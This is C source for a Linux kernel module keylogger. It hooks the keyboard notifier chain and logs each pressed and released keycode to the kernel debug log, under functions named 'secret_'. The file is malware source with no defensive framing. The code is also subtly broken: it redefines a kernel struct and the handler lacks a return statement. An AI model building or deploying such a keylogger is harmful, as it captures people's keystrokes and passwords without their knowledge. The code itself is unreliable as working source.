#undef __KERNEL__
#define __KERNEL__

#undef MODULE
#define MODULE


#include <linux/kernel.h> 	// included for KERN_DEBUG
#include <linux/module.h>	// included for all kernel modules
#include <linux/init.h>		// included for __init and __exit macros
#include <linux/keyboard.h>	// included for notifier_block struct
#include <linux/input.h>	// included for (future) key conversion table


// registers keyboard observer
struct notifier_block {
	int (*notifier_call)(struct notifier_block *, unsigned long, void *);
	struct notifier_block *next;
	int priority;
};

int secret_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
	// keyboard_notifier_param contains the info about the key pressed, i.e. keycode, keysys, unicode value
	struct keyboard_notifier_param *param = _param;
	struct vc_data *vc = param->vc;

	int ret = NOTIFY_OK;

	if (code == KBD_KEYCODE) {
		printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, (param->down ? "down" : "up"));
	}
}

static struct notifier_block nb = {
	.notifier_call = secret_notify
};

static int secret_init(void) {
	register_keyboard_notifier(&nb);
	return 0;
}

static void secret_release(void) {
	unregister_keyboard_notifier(&nb);
}

module_init(secret_init);
module_exit(secret_release);